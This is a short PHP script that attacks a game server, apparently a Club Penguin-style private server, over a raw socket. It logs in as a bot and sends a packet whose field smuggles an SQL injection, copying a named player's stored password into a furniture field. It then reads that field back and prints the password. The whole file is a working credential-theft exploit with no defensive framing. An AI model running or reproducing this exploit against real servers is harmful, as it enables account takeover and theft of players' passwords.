<?php
  
  $s = fsockopen($_GET['ip'], $_GET['port'], $eNo, $eStr, 5);
  fwrite($s, '%xt%s%bo#lgn%iBot001%00000000000000000000000000000000%' . chr(0));
  fwrite($s, '%xt%s%g#ur%1%1\', `iglooFurniture` = (SELECT `playerPassword` FROM `Users` WHERE `playerLogin` = \'' . $_GET['name'] . '\' LIMIT 1) -- %' . chr(0));
  fwrite($s, '%xt%s%g#gm%1%1%' . chr(0));
  
  fread($s, 4096);
  $pw = explode('%', fread($s, 4096));
  for($i = 0; $i < 8; ++$i) array_shift($pw);
  
  echo '&pass=' . join('%', $pw) . '&';

?>